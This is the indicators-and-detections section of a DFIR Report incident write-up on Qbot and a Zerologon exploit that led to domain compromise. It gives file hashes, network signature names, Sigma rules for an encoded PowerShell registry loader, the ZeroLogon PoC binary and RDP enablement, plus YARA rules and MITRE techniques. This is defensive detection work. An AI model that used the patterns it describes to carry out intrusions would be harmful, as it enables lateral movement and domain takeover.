<h3 class="ql-heading" data-block-id="block-8a6ae5e2-f9f8-45cf-82a1-81c14b1a79e5"><span class="ql-comment" data-comment-ids="985580733" data-comment-unresolved-ids="">File</span></h3>
<pre>Intial Exec Qbot DLL
MD5:53510e20efb161d5b71c4ce2800c1a8d
SHA1:2268178851d0d0debb9ab457d73af8a5e50af168
SHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987

QBot DLL (extracted from registry):
MD5:312e52b4109741893f17bc524084100f
SHA1:7ca650945223eab088f43fd472e3592be2ed9d32
SHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b

cool.exe
MD5:59E7F22D2C290336826700F05531BD30
SHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1
SHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0</pre>
<h2 class="ql-heading" data-block-id="block-34f43461-e5fd-4204-a21e-cd3ec5ac5666">Detections</h2>
<h3 class="ql-heading" data-block-id="block-48fbc5ed-7188-4c50-933a-1066bf64307e">Network</h3>
<pre>ET POLICY Powershell Activity Over SMB - Likely Lateral Movement
ET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET CNC Feodo Tracker Reported CnC Server group 15
ET CNC Feodo Tracker Reported CnC Server group 16

The following rules may cause performance issues (and are disabled by default) according to @ET_Labs
ET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870
ET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871 
ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888
ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889</pre>
<p data-block-id="block-2968562d-9336-4935-b5e9-e5a1caa60b91">New signatures thanks to <a href="https://twitter.com/ET_Labs/status/1496268159325818884">@ET_Labs</a>!</p>
<pre data-block-id="block-2968562d-9336-4935-b5e9-e5a1caa60b91">2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1
2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2
2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1
2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2
2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)
2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472)</pre>
<h3 class="ql-heading" data-block-id="block-2968562d-9336-4935-b5e9-e5a1caa60b91">Sigma</h3>
<pre>title: Scheduled task executing powershell encoded payload from registry
status: Experimental
description: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.
author: <span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">@Kostastsale</span>, @TheDFIRReport
references: 
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
date: 2022/02/12
logsource:
  product: windows
  category: process_creation
detection:
  selection1:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|all:
      - '/Create'
      - '/SC'
  selection2:
    CommandLine|contains|all:
      - 'FromBase64String'
      - 'powershell'
      - 'Get-ItemProperty'
      - 'HKCU:'
  condition: selection1 and selection2
falsepositives:
  - Uknown
level: high
tags:
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.001</pre>
<div class="ql-block" data-block-id="block-06e0cfa2-105d-403f-85cc-98ac5a8699c7"></div>
<pre>title: Execution of ZeroLogon PoC executable
status: Experimental
description: Detects the execution of the commonly used ZeroLogon PoC executable.
author: <span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">@Kostastsale,</span> @TheDFIRReport
references: 
  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
date: 2022/02/12
logsource:
  product: windows
  category: process_creation
detection:
  selection1:
    ParentImage|endswith: 
      - '\cmd.exe'
    Image|endswith: 
      - '\cool.exe'
      - '\zero.exe'
    CommandLine|contains|all:
      - 'Administrator'
      - '-c'
  selection2:
    CommandLine|contains|all:
      - 'taskkill'
      - '/f'
      - '/im'
  selection3:
    CommandLine|contains:
      - 'powershell'
  condition: selection1 and (selection2 or selection3)
falsepositives:
  - Uknown
level: high
tags:
  - attack.execution
  - attack.lateral_movement
  - attack.T1210</pre>
<div class="ql-block" data-block-id="block-883f44fc-9433-4041-ad0a-44705fa9f71c"></div>
<pre>title:  Enabling RDP service via reg.exe command execution
status: Experimental
description: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host 
author: <span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">@Kostastsale</span>, @TheDFIRReport
references: 
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
date: 2022/02/12
logsource:
  product: windows
  category: process_creation
detection:
  selection1:
    Image|endswith: 
      - '\reg.exe'
    CommandLine|contains|all:
      - 'add'
      - 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server'
      - 'REG_DWORD'
  Winstations1:
    CommandLine|contains:
      - 'WinStations\RDP-Tcp'
  Winstations2:
    CommandLine|contains:
      - 'MaxInstanceCount'
      - 'fEnableWinStation'
  selection2:
    CommandLine|contains|all:
      - 'Licensing Core'
      - 'EnableConcurrentSessions'
  selection3:
    CommandLine|contains:
      - 'TSUserEnabled'
      - 'TSEnabled'
      - 'TSAppCompat'
      - 'IdleWinStationPoolCount'
      - 'TSAdvertise'
      - 'AllowTSConnections'
      - 'fSingleSessionPerUser'
  condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))
falsepositives:
  - Uknown
level: high
tags:
  - attack.defense_evasion
  - attack.lateral_movement
  - attack.t1021.001
  - attack.t1112</pre>
<div class="ql-block" data-block-id="block-c45d1594-eb72-4104-8c2f-6e160a9123c9"></div>
<ul>
<li><a href="https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml">https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml">https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml">https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml">https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml">https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml">https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml">https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml</a></li>
</ul>
<h3 class="ql-heading" data-block-id="block-33275742-757f-433e-b6c8-396da52b0f6f">Yara</h3>
<div class="ql-block" data-block-id="block-fba2a6a9-d4c9-4cfe-91da-edad976630ad"></div>
<pre>/*
   YARA Rule Set
   Author: The DFIR Report
   Date: 2022-02-20
   Identifier: Case 8734
   Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
*/


/* Rule Set ----------------------------------------------------------------- */


import "pe"


rule qbot_8734_payload_dll {
   meta:
      description = "files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2022-02-20"
      hash1 = "e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987"
   strings:
      $s1 = "Terfrtghygine.dll" fullword ascii
      $s2 = "Winamp can read extended metadata for titles. Choose when this happens:" fullword wide /* Goodware String - occured 1 times */
      $s3 = "Read metadata when file(s) are loaded into Winamp" fullword wide /* Goodware String - occured 1 times */
      $s4 = "Use advanced title formatting when possible" fullword wide /* Goodware String - occured 1 times */
      $s5 = "PQVW=!?" fullword ascii
      $s6 = "Show underscores in titles as spaces" fullword wide /* Goodware String - occured 1 times */
      $s7 = "Advanced title display format :" fullword wide /* Goodware String - occured 1 times */
      $s8 = "CreatePaint" fullword ascii
      $s9 = "PQRVW=2\"" fullword ascii
      $s10 = "Advanced Title Formatting" fullword wide /* Goodware String - occured 1 times */
      $s11 = "Read metadata when file(s) are played or viewed in the playlist editor" fullword wide /* Goodware String - occured 1 times */
      $s12 = "Show '%20's in titles as spaces" fullword wide /* Goodware String - occured 1 times */
      $s13 = "Example : \"%artist% - %title%\"" fullword wide /* Goodware String - occured 1 times */
      $s14 = "PQRVW=g" fullword ascii
      $s15 = "PQRW=e!" fullword ascii
      $s16 = "ATF Help" fullword wide /* Goodware String - occured 1 times */
      $s17 = "(this can be slow if a large number of files are added at once)" fullword wide /* Goodware String - occured 1 times */
      $s18 = "PQRVW=$" fullword ascii
      $s19 = "Metadata Reading" fullword wide /* Goodware String - occured 1 times */
      $s20 = "Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ..." fullword wide /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 2000KB and
      ( pe.imphash() == "aa8a9db10fba890f8ef9edac427eab82" and pe.exports("CreatePaint") or 8 of them )
}


rule qbot_dll_8734 {
   meta:
      description = "files - qbot.dll"
      author = "TheDFIRReport"
      reference = "QBOT_DLL"
      date = "2021-12-04"
      hash1 = "4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b"
   strings:
      $s1 = "Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc" wide
      $s2 = "IDAPI32.DLL" fullword ascii
      $s3 = "ResetUsageDataActnExecute" fullword ascii
      $s4 = "idapi32.DLL" fullword ascii
      $s5 = "ShowHintsActnExecute" fullword ascii
      $s6 = "OnExecute@iG" fullword ascii
      $s7 = "OnExecutexnD" fullword ascii
      $s8 = "ShowShortCutsInTipsActnExecute" fullword ascii
      $s9 = "ResetActnExecute " fullword ascii
      $s10 = "RecentlyUsedActnExecute" fullword ascii
      $s11 = "LargeIconsActnExecute" fullword ascii
      $s12 = "ResetActnExecute" fullword ascii
      $s13 = "OnExecute&lt;" fullword ascii
      $s14 = "TLOGINDIALOG" fullword wide
      $s15 = "%s%s:\"%s\";" fullword ascii
      $s16 = ":\":&amp;:7:?:C:\\:" fullword ascii /* hex encoded string '|' */
      $s17 = "LoginPrompt" fullword ascii
      $s18 = "TLoginDialog" fullword ascii
      $s19 = "OnLogin" fullword ascii
      $s20 = "Database Login" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 3000KB and
      8 of the</pre>
<h2 class="ql-heading" data-block-id="block-f7383495-edd5-4415-897e-55027ddd109b">MITRE</h2>
<ul>
<li>Exploitation for Privilege Escalation – T1068</li>
<li>Service Execution – T1569.002</li>
<li>Network Share Discovery – T1135</li>
<li>Pass the Hash – T1550.002</li>
<li>PowerShell – T1059.001</li>
<li>Windows Command Shell – T1059.003</li>
<li>Network Share Discovery – T1135</li>
<li>Obfuscated Files or Information – T1027</li>
<li>Scheduled Task – T1053.005</li>
<li>Process Injection – T1055</li>
<li>Remote System Discovery – T1018</li>
<li>Obfuscated Files or Information – T1027</li>
<li>Domain Trust Discovery – T1482</li>
<li>Domain Groups – T1069.002</li>
<li>System Owner/User Discovery – T1033</li>
<li>Network Share Discovery – T1135</li>
<li>Remote Services – T1021</li>
<li>Local Account – T1087.001</li>
<li>Security Software Discovery &#8211; T1518.001</li>
</ul>
<div class="ql-block" data-block-id="block-db46ae98-05db-4d2e-9061-569230919f7c"></div>
<div class="ql-block" data-block-id="block-b8edd95f-70a2-4d09-9794-8b09fa117120"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-5608" src="https://thedfirreport.com/wp-content/uploads/2022/02/MITRE_Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise.png" alt="" width="1722" height="1342" srcset="https://thedfirreport.com/wp-content/uploads/2022/02/MITRE_Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise.png 1722w, https://thedfirreport.com/wp-content/uploads/2022/02/MITRE_Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-300x234.png 300w, https://thedfirreport.com/wp-content/uploads/2022/02/MITRE_Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-1024x798.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/02/MITRE_Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-768x599.png 768w, https://thedfirreport.com/wp-content/uploads/2022/02/MITRE_Qbot-and-Zerologon-Lead-To-Full-Domain-Compromise-1536x1197.png 1536w" sizes="auto, (max-width: 1722px) 100vw, 1722px" /></div>
<div class="ql-block" data-block-id="block-86229509-44af-427b-86cc-28c9ed121be7"></div>
<div class="ql-block" data-block-id="block-f03633b9-58df-4427-a9dc-d097db918970">Internal case 8734</div>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-5552" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-5552" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-5552" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-5552 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/" rel="prev">Qbot Likes to Move It, Move It</a></div><div class="nav-next"><a href="https://thedfirreport.com/2022/03/07/2021-year-in-review/" rel="next">2021 Year In Review</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="5f8e4cdff7" /><input type="hidden" name="_wp_http_referer" value="/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/" /><input type="hidden" name="post_id" value="5552"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="1a310a3e4aa21af3edc3a22f-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2022\/02\/21\/qbot-and-zerologon-lead-to-full-domain-compromise\/":5552};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form 